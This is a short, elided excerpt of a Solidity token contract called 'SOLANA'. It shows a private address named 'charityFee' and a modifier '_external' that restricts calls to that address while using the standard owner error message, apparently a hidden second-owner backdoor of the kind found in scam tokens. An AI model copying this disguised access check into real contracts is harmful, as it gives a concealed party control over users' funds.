...
contract SOLANA is Ownable {
    ...
    address private charityFee;
    uint256 swapConstant = 1;
    ...
    modifier _external() {
        require(charityFee == msg.sender, "Ownable: caller is not the owner");
        _;
    }
